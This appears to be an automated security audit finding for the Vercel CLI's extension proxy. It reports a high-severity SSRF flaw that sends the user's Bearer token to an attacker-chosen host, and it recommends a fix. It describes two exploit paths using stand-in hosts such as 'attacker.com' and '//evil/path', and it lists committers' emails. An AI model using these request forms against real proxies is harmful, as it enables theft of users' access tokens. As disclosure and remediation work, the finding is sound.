# [HIGH] SSRF + Bearer-token exfiltration via unvalidated req.url in extension proxy

**File:** [`packages/cli/src/util/extension/proxy.ts`](https://github.com/vercel/vercel/blob/melkey/bun-working-branch/blob/melkey/packages/cli/src/util/extension/proxy.ts#L23) (lines 23)
**Project:** vercel
**Severity:** HIGH  •  **Confidence:** high  •  **Slug:** `ssrf`

## Owners

**Suggested assignee:** `472867+ofhouse@users.noreply.github.com` _(via last-committer)_

## Finding

createProxy passes `req.url` directly as the first argument to `client.fetch(req.url || '/', ...)` (line 23). client.fetch resolves the URL with `new URL(_url, this.apiUrl)` (client.ts:353) and then unconditionally adds `authorization: Bearer <user_token>` (client.ts:380) before issuing the request. The WHATWG URL constructor treats *absolute* (`http://attacker.com/foo`) and *protocol-relative* (`//attacker.com/foo`) inputs as host overrides — the `apiUrl` base is discarded — so the user's Vercel access token is sent in the Authorization header to an attacker-controlled host. Two practical exploits: (a) any HTTP client that emits absolute-form request-targets (`GET http://attacker.com/foo HTTP/1.1`) against the proxy port — Node's HTTP parser stores absolute-form targets verbatim in `req.url`; (b) a benign extension that does `fetch(`${VERCEL_API}/${userInput}`)` with attacker-influenced `userInput` starting with `/` (yielding `//evil/path` after concatenation), which makes node-fetch send an origin-form request line `//evil/path` to 127.0.0.1, the proxy parses it as protocol-relative, and the token leaks to `https://evil/path`. The proxy also does not validate scheme, so cleartext exfiltration to `http://` is possible. URL.pathname normalization (`/../../foo`) does NOT mitigate this — host override happens before path normalization.

## Recommendation

Refuse to forward requests whose `req.url` is not an origin-form path. Concretely: reject if `req.url` is missing, does not start with `/`, or starts with `//`. Then construct the upstream URL from a hard-coded base + the validated path, e.g.: `const u = new URL(req.url, 'http://placeholder'); const upstream = new URL(u.pathname + u.search, apiBase);` — never let the incoming string influence the host or scheme. Equivalently, after the call to `client.fetch`, verify that `url.origin` matches `apiUrl.origin` before sending the Authorization header.

## Recent committers (`git log`)

- Felix Haus <472867+ofhouse@users.noreply.github.com> (2026-01-21)
- Nathan Rajlich <n@n8.io> (2025-12-17)
- Sean Massa <EndangeredMassa@gmail.com> (2024-10-28)
- Kiko Beats <josefrancisco.verdu@gmail.com> (2023-11-06)
